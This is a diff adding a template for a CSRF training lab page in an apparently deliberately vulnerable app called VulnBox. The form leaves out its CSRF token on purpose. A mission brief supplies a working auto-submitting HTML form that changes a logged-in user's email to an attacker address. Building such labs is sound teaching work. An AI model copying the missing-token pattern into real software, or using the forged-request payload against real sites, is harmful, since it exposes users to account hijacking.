@@ -1,0 +1,147 @@
+{% extends 'base.html' %}
+
+{% block title %}CSRF Lab{% endblock %}
+
+{% block content %}
+<style>
+    .lab-container {
+        max-width: 600px;
+        margin: 4rem auto;
+        padding: 2.5rem;
+        background-color: rgba(10, 10, 10, 0.6);
+        border: 1px solid rgba(57, 255, 20, 0.2);
+        border-radius: 12px;
+        backdrop-filter: blur(10px);
+    }
+
+    .lab-container h1 {
+        font-size: 1.8rem;
+        font-weight: 700;
+        color: #39FF14;
+        margin-bottom: 0.5rem;
+    }
+
+    .lab-container .current-email {
+        color: #9CA3AF;
+        margin-bottom: 2rem;
+    }
+    
+    .form-group label {
+        display: block;
+        color: #F9FAFB;
+        margin-bottom: 0.5rem;
+        font-weight: 500;
+    }
+
+    .form-group input {
+        width: 100%;
+        background-color: rgba(10, 10, 10, 0.8);
+        border: 1px solid #374151;
+        color: #F9FAFB;
+        padding: 0.75rem 1rem;
+        border-radius: 8px;
+        transition: border-color 0.2s, box-shadow 0.2s;
+    }
+
+    .form-group input:focus {
+        outline: none;
+        border-color: #39FF14;
+        box-shadow: 0 0 10px rgba(57, 255, 20, 0.2);
+    }
+
+    .submit-btn {
+        width: 100%;
+        background-color: #6AFFAF;
+        color: #111827;
+        font-weight: bold;
+        padding: 0.75rem;
+        border-radius: 8px;
+        border: none;
+        cursor: pointer;
+        transition: background-color 0.2s;
+        margin-top: 1rem;
+    }
+
+    .submit-btn:hover {
+        background-color: #8BFFC8;
+    }
+    
+    .success-message {
+        text-align: center;
+        color: #39FF14;
+        margin-top: 1.5rem;
+        font-weight: 500;
+    }
+
+    /* ✅ NEW: Styling for the Mission Brief section */
+    .mission-brief {
+        margin-top: 3rem;
+        padding: 1.5rem;
+        border: 1px dashed rgba(57, 255, 20, 0.3);
+        border-radius: 8px;
+        text-align: left;
+    }
+    .mission-brief h2 {
+        color: #fff;
+        font-weight: 600;
+        margin-bottom: 1rem;
+    }
+    .mission-brief p, .mission-brief li {
+        color: #9CA3AF;
+        font-size: 0.9rem;
+        line-height: 1.6;
+    }
+    .mission-brief code {
+        background-color: #0A0A0A;
+        border: 1px solid #374151;
+        color: #F3F4F6;
+        padding: 1rem;
+        border-radius: 4px;
+        font-family: 'Roboto Mono', monospace;
+        display: block;
+        white-space: pre-wrap;
+        margin-top: 1rem;
+    }
+</style>
+
+<div class="lab-container">
+    <h1>Account Settings</h1>
+    <p class="current-email">Your current email is: <strong>{{ user_email }}</strong></p>
+
+    <form method="post">
+        <!-- NOTE: A real, secure form would have {% csrf_token %} here. We are intentionally leaving it out to create the vulnerability. -->
+        <div class="form-group">
+            <label for="email">New Email Address</label>
+            <input type="email" id="email" name="email" required>
+        </div>
+        <button type="submit" class="submit-btn">Update Email</button>
+
+        {% if success_message %}
+            <div class="success-message">
+                <p>{{ success_message }}</p>
+            </div>
+        {% endif %}
+    </form>
+
+    <!-- ✅ NEW: Mission Brief Section with Instructions -->
+    <div class="mission-brief">
+        <h2>Mission Brief</h2>
+        <p>This page is vulnerable to CSRF. Your goal is to create a malicious HTML file that, when opened by a logged-in user, will force their browser to change their email to "attacker@example.com".</p>
+        <ol class="list-decimal list-inside mt-4">
+            <li>Create a new file on your computer named <code>csrf_attack.html</code>.</li>
+            <li>Paste the following code into the file.</li>
+            <li>Make sure you are logged into VulnBox, then open the <code>csrf_attack.html</code> file in the same browser.</li>
+        </ol>
+        <code>&lt;html&gt;
+  &lt;body&gt;
+    &lt;form action="http://127.0.0.1:8000/lab/csrf/" method="POST"&gt;
+      &lt;input type="hidden" name="email" value="attacker@example.com" /&gt;
+    &lt;/form&gt;
+    &lt;script&gt;
+      document.forms[0].submit();
+    &lt;/script&gt;
+  &lt;/body&gt;
+&lt;/html&gt;</code>
+    </div>
+</div>
+{% endblock %}
